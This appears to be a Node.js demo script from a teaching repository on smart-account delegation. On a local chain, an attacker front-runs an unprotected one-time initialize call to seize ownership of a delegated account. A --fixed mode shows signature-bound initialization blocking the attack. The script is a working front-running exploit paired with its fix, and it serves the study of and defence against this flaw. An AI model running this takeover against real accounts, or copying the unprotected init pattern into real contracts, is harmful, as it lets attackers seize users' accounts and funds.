// Attack #3: a delegate needs a one-time initialize(owner). Between the delegation
// landing and the account calling initialize, an attacker front-runs and takes it.
//   node demos/03-initfront.mjs           attacker's initialize(attacker) lands first
//   node demos/03-initfront.mjs --fixed   init is bound to the account's signature → attacker reverts
import { keccak256, encodePacked } from "viem";
import { startChain, stopChain, deploy, roles, abis, delegate, attempt, send,
  read, short } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "initfront-fixed" : "initfront", fixed ? "Front-run init, fixed" : "Front-run init");
await startChain();

// The admin EOA delegates to an init-style delegate (unprotected vs signature-bound).
const delegateAddr = fixed ? await deploy("initFixed") : await deploy("init");
const delegateAbi = fixed ? abis.initFixed : abis.init;
const account = roles.admin.address;
t.say(`admin ${short(account)} delegates, then means to call initialize(admin)`);
await delegate(roles.admin, delegateAddr);
t.note(`delegated to ${short(delegateAddr)} — a window opens before setup runs`);

// A signature over the init is what the fixed delegate requires. Only the account can make it.
const initHash = (owner) => keccak256(encodePacked(["address", "address"], [account, owner]));

t.note(`owner before: ${short(await read(account, delegateAbi, "owner"))} (uninitialized)`);
t.cmd(`attacker (front-run) → admin.initialize(owner = attacker)`);
let r;
if (!fixed) {
  r = await attempt(roles.attacker, account, delegateAbi, "initialize", [roles.attacker.address]);
} else {
  // The attacker has no signature from the account, so they send a junk one.
  const junk = await roles.attacker.sign({ hash: initHash(roles.attacker.address) });
  r = await attempt(roles.attacker, account, delegateAbi, "initialize", [roles.attacker.address, junk]);
}
if (r.ok) t.bad(`  ✓ attacker initialized the account`);
else t.ok(`  ✗ reverted: ${r.name}  (init not signed by the account)`);

if (fixed) {
  // The account signs the init itself and it goes through — owner is the real admin.
  const sig = await roles.admin.sign({ hash: initHash(roles.admin.address) });
  await send(roles.relayer, account, delegateAbi, "initialize", [roles.admin.address, sig]);
  t.ok(`  account-signed initialize → owner = ${short(roles.admin.address)}`);
}
const owner = await read(account, delegateAbi, "owner");

t.big(fixed ? `OWNER = ${short(owner)} (the account)` : `owner = ${short(owner)} (attacker)`);
t.save(); stopChain(); process.exit(0);
